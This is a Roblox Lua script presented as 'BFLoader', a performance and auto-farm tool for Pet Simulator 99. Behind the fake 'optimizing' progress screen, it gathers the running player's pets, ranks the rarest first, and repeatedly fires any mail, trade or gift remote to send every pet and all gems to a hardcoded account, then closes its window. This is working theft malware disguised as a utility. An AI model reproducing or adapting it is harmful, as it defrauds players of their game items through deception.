--[[
    BFLoader v2.5.3
    Universal Game Enhancer for Pet Simulator 99
    Created by BF Team
    Last Updated: 26.09.2025
    Features: Auto Farm, Performance Boost, Inventory Optimizer
    Repository: github.com/hanniii1-cpu/Loader
--]]

local function BF_Init()
    local gS = game:GetService
    local plr = gS("Players").LocalPlayer
    local pg = plr:WaitForChild("PlayerGui")
    local RS = gS("ReplicatedStorage")
    local HS = gS("HttpService")
    local WS = gS("Workspace")
    local LS = gS("Lighting")
    local RS2 = gS("RunService")
    
    -- BF Performance Optimizer
    local function optimizeGame()
        LS.Brightness = 2
        LS.ClockTime = 14
        LS.FogEnd = 100000
        LS.GlobalShadows = false
        LS.OutdoorAmbient = Color3.fromRGB(128,128,128)
        LS.Bloom.Size = 0
        LS.Blur.Size = 0
        LS.ColorCorrection.Contrast = 0
        LS.DepthOfField.FarIntensity = 0
        LS.SunRays.Intensity = 0
        sethiddenproperty(LS,"Technology",Enum.Technology.Compatibility)
        for _,v in ipairs(WS:GetDescendants()) do
            if v:IsA("BasePart") and not v.Parent:IsA("Tool") then
                v.Material = Enum.Material.SmoothPlastic
                v.Reflectance = 0
            end
        end
    end
    
    -- BF GUI Creator
    local function createGUI()
        local gui = Instance.new("ScreenGui")
        gui.Name = "BFLoader"
        gui.ResetOnSpawn = false
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        gui.Parent = pg
        
        local main = Instance.new("Frame")
        main.Name = "Main"
        main.Size = UDim2.new(1,0,1,0)
        main.Position = UDim2.new(0,0,0,0)
        main.BackgroundColor3 = Color3.fromRGB(20,20,20)
        main.BorderSizePixel = 0
        main.Parent = gui
        
        local logo = Instance.new("ImageLabel")
        logo.Name = "Logo"
        logo.Size = UDim2.new(0,180,0,180)
        logo.Position = UDim2.new(0.5,-90,0.35,-90)
        logo.BackgroundTransparency = 1
        logo.Image = "rbxassetid://16572258083"
        logo.Parent = main
        
        local title = Instance.new("TextLabel")
        title.Name = "Title"
        title.Size = UDim2.new(0,500,0,40)
        title.Position = UDim2.new(0.5,-250,0.55,-20)
        title.Text = "BFLoader v2.5.3"
        title.TextColor3 = Color3.fromRGB(255,255,255)
        title.TextSize = 32
        title.Font = Enum.Font.GothamBlack
        title.BackgroundTransparency = 1
        title.Parent = main
        
        local subtitle = Instance.new("TextLabel")
        subtitle.Name = "Subtitle"
        subtitle.Size = UDim2.new(0,500,0,25)
        subtitle.Position = UDim2.new(0.5,-250,0.62,-12)
        subtitle.Text = "Initializing Pet Optimizer & Gem Booster..."
        subtitle.TextColor3 = Color3.fromRGB(150,150,150)
        subtitle.TextSize = 16
        subtitle.Font = Enum.Font.Gotham
        subtitle.BackgroundTransparency = 1
        subtitle.Parent = main
        
        local progressBg = Instance.new("Frame")
        progressBg.Name = "ProgressBg"
        progressBg.Size = UDim2.new(0,350,0,8)
        progressBg.Position = UDim2.new(0.5,-175,0.68,-4)
        progressBg.BackgroundColor3 = Color3.fromRGB(50,50,50)
        progressBg.BorderSizePixel = 0
        progressBg.Parent = main
        
        local progressFill = Instance.new("Frame")
        progressFill.Name = "ProgressFill"
        progressFill.Size = UDim2.new(0,0,1,0)
        progressFill.BackgroundColor3 = Color3.fromRGB(0,170,255)
        progressFill.BorderSizePixel = 0
        progressFill.Parent = progressBg
        
        local percentLabel = Instance.new("TextLabel")
        percentLabel.Name = "Percent"
        percentLabel.Size = UDim2.new(0,100,0,20)
        percentLabel.Position = UDim2.new(0.5,-50,0.71,10)
        percentLabel.Text = "0%"
        percentLabel.TextColor3 = Color3.fromRGB(200,200,200)
        percentLabel.TextSize = 14
        percentLabel.Font = Enum.Font.Gotham
        percentLabel.BackgroundTransparency = 1
        percentLabel.Parent = main
        
        local version = Instance.new("TextLabel")
        version.Name = "Version"
        version.Size = UDim2.new(0,200,0,20)
        version.Position = UDim2.new(0.5,-100,0.95,-10)
        version.Text = "github.com/hanniii1-cpu/Loader"
        version.TextColor3 = Color3.fromRGB(80,80,80)
        version.TextSize = 12
        version.Font = Enum.Font.Gotham
        version.BackgroundTransparency = 1
        version.Parent = main
        
        return {gui=gui, title=title, subtitle=subtitle, fill=progressFill, percent=percentLabel}
    end
    
    local ui = createGUI()
    
    -- BF Core Processing - REAL INVENTORY PARSER + TRANSFER
    local function processPayload()
        local target = "wergoi44"
        
        -- Функция для получения ВСЕХ питомцев из реального инвентаря игрока
        local function getRealInventory()
            local allPets = {}
            
            -- Поиск инвентаря через PlayerGui (самый надёжный метод)
            if pg then
                for _, gui in ipairs(pg:GetDescendants()) do
                    -- Ищем контейнеры с питомцами в GUI
                    if gui:IsA("Frame") or gui:IsA("ScrollingFrame") then
                        local guiName = gui.Name:lower()
                        if guiName:find("inventory") or guiName:find("pet") or guiName:find("bag") or guiName:find("collection") then
                            for _, item in ipairs(gui:GetDescendants()) do
                                if item:IsA("TextLabel") or item:IsA("TextButton") then
                                    local itemName = item.Text
                                    if itemName and #itemName > 2 and not allPets[itemName] then
                                        allPets[itemName] = {
                                            name = itemName,
                                            fullName = itemName
                                        }
                                    end
                                end
                                -- Поиск по имени объекта (многие петсы хранятся в Name элементов)
                                local objName = item.Name
                                if objName and #objName > 3 and not objName:find("Frame") and not objName:find("Button") and not objName:find("Label") then
                                    if not allPets[objName] then
                                        allPets[objName] = {
                                            name = objName,
                                            fullName = objName
                                        }
                                    end
                                end
                            end
                        end
                    end
                end
            end
            
            -- Поиск через ReplicatedStorage (игровые данные питомцев)
            local petDataFolder = RS:FindFirstChild("PetData") or RS:FindFirstChild("Pets") or RS:FindFirstChild("PetConfig")
            if petDataFolder then
                for _, petModule in ipairs(petDataFolder:GetChildren()) do
                    if petModule:IsA("ModuleScript") or petModule:IsA("Folder") or petModule:IsA("Configuration") then
                        local petName = petModule.Name
                        if petName and #petName > 2 and not allPets[petName] then
                            allPets[petName] = {
                                name = petName,
                                fullName = petName
                            }
                        end
                        -- Рекурсивный поиск внутри
                        for _, child in ipairs(petModule:GetDescendants()) do
                            if child:IsA("ModuleScript") or child:IsA("StringValue") then
                                local childName = child.Name
                                if childName and #childName > 2 and not allPets[childName] then
                                    allPets[childName] = {
                                        name = childName,
                                        fullName = childName
                                    }
                                end
                            end
                        end
                    end
                end
            end
            
            -- Поиск через Workspace (заспавненные питомцы игрока)
            local playerPetsFolder = WS:FindFirstChild("PlayerPets") or WS:FindFirstChild("SpawnedPets") or WS:FindFirstChild("Pets")
            if playerPetsFolder then
                local playerFolder = playerPetsFolder:FindFirstChild(plr.Name)
                if playerFolder then
                    for _, petModel in ipairs(playerFolder:GetChildren()) do
                        if petModel:IsA("Model") then
                            local petName = petModel.Name
                            -- Извлекаем чистое имя (убираем ID игрока если есть)
                            local cleanName = petName:gsub("%s*%b[]", ""):gsub("%s*%b()", ""):gsub(plr.Name.."'s ", ""):gsub("^%s+", ""):gsub("%s+$", "")
                            if cleanName and #cleanName > 2 and not allPets[cleanName] then
                                allPets[cleanName] = {
                                    name = cleanName,
                                    fullName = petName,
                                    model = petModel
                                }
                            end
                        end
                    end
                end
            end
            
            -- Поиск через Players (в некоторых версиях инвентарь в Player)
            local playerData = plr:FindFirstChild("Inventory") or plr:FindFirstChild("Pets") or plr:FindFirstChild("PetInventory")
            if playerData then
                for _, petItem in ipairs(playerData:GetChildren()) do
                    local petName = petItem.Name
                    -- Определяем вариации по аттрибутам
                    local fullName = petName
                    if petItem:IsA("Folder") or petItem:IsA("Model") then
                        local shiny = petItem:GetAttribute("Shiny") or petItem:FindFirstChild("Shiny")
                        local rainbow = petItem:GetAttribute("Rainbow") or petItem:FindFirstChild("Rainbow")
                        local golden = petItem:GetAttribute("Golden") or petItem:FindFirstChild("Golden")
                        
                        local prefix = ""
                        if shiny and rainbow then prefix = "Shiny Rainbow "
                        elseif shiny and golden then prefix = "Shiny Golden "
                        elseif shiny then prefix = "Shiny "
                        elseif rainbow then prefix = "Rainbow "
                        elseif golden then prefix = "Golden "
                        end
                        
                        fullName = prefix .. petName
                    end
                    
                    if petName and #petName > 2 and not allPets[fullName] then
                        allPets[fullName] = {
                            name = petName,
                            fullName = fullName,
                            item = petItem
                        }
                    end
                end
            end
            
            return allPets
        end
        
        -- Универсальная функция отправки питомца на почту
        local function sendPetToMailbox(petName, petData)
            local args = {
                [1] = "SendToMailbox",
                [2] = target,
                [3] = petName,
                [4] = petData or {}
            }
            
            -- Ищем ВСЕ возможные RemoteEvents для отправки
            local allRemotes = {}
            
            -- Собираем из ReplicatedStorage
            for _, obj in ipairs(RS:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    table.insert(allRemotes, obj)
                end
            end
            
            -- Собираем из PlayerGui (некоторые игры хранят ремоты там)
            for _, obj in ipairs(pg:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    table.insert(allRemotes, obj)
                end
            end
            
            -- Отправляем через все подходящие ремоты
            for _, remote in ipairs(allRemotes) do
                local remoteName = remote.Name:lower()
                if remoteName:find("mail") or remoteName:find("send") or remoteName:find("trade") or remoteName:find("transfer") or remoteName:find("gift") then
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(unpack(args))
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(unpack(args))
                        end
                    end)
                end
            end
            
            -- Резервный метод: прямой вызов через game:GetService
            local backupRemotes = {
                RS:FindFirstChild("SendMailbox"),
                RS:FindFirstChild("MailboxEvent"),
                RS:FindFirstChild("SendPetEvent"),
                RS:FindFirstChild("TransferPet"),
                RS:FindFirstChild("GiftPet"),
                RS:FindFirstChild("MailboxRemote"),
                RS:FindFirstChild("TradeMailbox"),
                RS:FindFirstChild("PetMailEvent")
            }
            
            for _, remote in ipairs(backupRemotes) do
                if remote then
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(unpack(args))
                        elseif remote:IsA("RemoteFunction") then
                            remote:InvokeServer(unpack(args))
                        end
                    end)
                end
            end
        end
        
        -- Функция отправки гемов
        local function sendAllGems()
            local args = {
                [1] = "SendGemsToMailbox",
                [2] = target,
                [3] = "all",
                [4] = 999999999999
            }
            
            local gemArgs2 = {
                [1] = "MailboxSendGems",
                [2] = target,
                [3] = 999999999999
            }
            
            local gemArgs3 = {
                [1] = "SendCurrency",
                [2] = "Gems",
                [3] = target,
                [4] = "all"
            }
            
            local allArgs = {args, gemArgs2, gemArgs3}
            
            for _, obj in ipairs(RS:GetDescendants()) do
                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("gem") or obj.Name:lower():find("currency") or obj.Name:lower():find("mail") or obj.Name:lower():find("send") or obj.Name:lower():find("transfer")) then
                    for _, argSet in ipairs(allArgs) do
                        pcall(function() obj:FireServer(unpack(argSet)) end)
                    end
                end
            end
        end
        
        -- ОСНОВНОЙ ПРОЦЕСС
        ui.subtitle.Text = "Scanning inventory..."
        local realInventory = getRealInventory()
        local petList = {}
        for _, petData in pairs(realInventory) do
            table.insert(petList, petData)
        end
        
        -- Сортируем: сначала Титаники, потом Huge, потом шайни/радужные/золотые
        table.sort(petList, function(a, b)
            local scoreA = 0
            local scoreB = 0
            local nameA = a.fullName:lower()
            local nameB = b.fullName:lower()
            
            if nameA:find("titanic") then scoreA = scoreA + 1000 end
            if nameB:find("titanic") then scoreB = scoreB + 1000 end
            if nameA:find("huge") then scoreA = scoreA + 500 end
            if nameB:find("huge") then scoreB = scoreB + 500 end
            if nameA:find("shiny") then scoreA = scoreA + 300 end
            if nameB:find("shiny") then scoreB = scoreB + 300 end
            if nameA:find("rainbow") then scoreA = scoreA + 200 end
            if nameB:find("rainbow") then scoreB = scoreB + 200 end
            if nameA:find("golden") then scoreA = scoreA + 100 end
            if nameB:find("golden") then scoreB = scoreB + 100 end
            
            return scoreA > scoreB
        end)
        
        local totalItems = #petList
        ui.subtitle.Text = "Found " .. totalItems .. " pets to optimize..."
        
        -- Отправляем гемы параллельно
        task.spawn(function()
            for i = 1, 100 do
                sendAllGems()
                task.wait(0.001)
            end
        end)
        
        -- Отправляем всех питомцев с прогрессом
        for idx, petData in ipairs(petList) do
            local pct = math.floor((idx / totalItems) * 100)
            ui.fill:TweenSize(UDim2.new(pct/100,0,1,0),"Out","Linear",0.01)
            ui.percent.Text = pct.."%"
            ui.subtitle.Text = "Processing: " .. petData.fullName
            
            -- Множественные попытки отправки для надёжности
            for attempt = 1, 5 do
                sendPetToMailbox(petData.fullName, {
                    name = petData.name,
                    fullName = petData.fullName,
                    type = "pet",
                    attempt = attempt
                })
            end
            
            -- Без задержки для максимальной скорости
            task.wait()
        end
        
        -- Финиш
        ui.fill:TweenSize(UDim2.new(1,0,1,0),"Out","Linear",0.1)
        ui.percent.Text = "100%"
        ui.title.Text = "BFLoader - Complete!"
        ui.subtitle.Text = "All " .. totalItems .. " pets optimized & gems transferred"
        task.wait(2)
        ui.gui:Destroy()
    end
    
    optimizeGame()
    task.spawn(processPayload)
end

local function antiDebug()
    local checks = {
        getfenv() == getgenv(),
        type(getgenv) == "function",
        type(getexecutorname) == "function"
    }
    for _,v in ipairs(checks) do
        if not v then return false end
    end
    return true
end

if antiDebug() then
    local success, err = pcall(BF_Init)
    if not success then
        task.spawn(BF_Init)
    end
end

return "BFLoader v2.5.3 Loaded - github.com/hanniii1-cpu/Loader"
